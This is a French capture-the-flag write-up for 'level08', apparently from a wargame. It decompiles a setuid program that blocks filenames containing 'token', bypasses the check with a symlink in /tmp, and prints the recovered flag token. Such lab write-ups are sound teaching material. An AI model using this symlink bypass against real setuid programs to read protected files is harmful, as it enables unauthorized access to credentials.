# level08

```bash
ls -la
```
```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
2 fichiers intéressant on voit tout de suite que l'on a aucun droit sur le token

voyons plutôt l'exécutable avec ghidra:

```c
/* WARNING: Unknown calling convention */

int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  int fd;
  int rc;
  char buf [1024];
  undefined1 local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)in_stack_00000008[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",in_stack_00000008[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return sVar2;
}
```

essayons:
```
./level08 token
```
output:
```
You may not access 'token'
```

Nous obtiendrons plus de droit avec un lien symbolic
pour connaitre le chemin absolu: realpath [fichier]

```bash
ln -fs /home/user/level08/token /tmp/test
```
```bash
ls -la /tmp/test
```
output:
```
lrwxrwxrwx 1 level08 level08 24 Jun 27 04:02 /tmp/test -> /home/user/level08/token
```

on a les droits sur /tmp/test

essayons:`./level08 /tmp/test`
output: `quif5eloekouj29ke0vouxean`
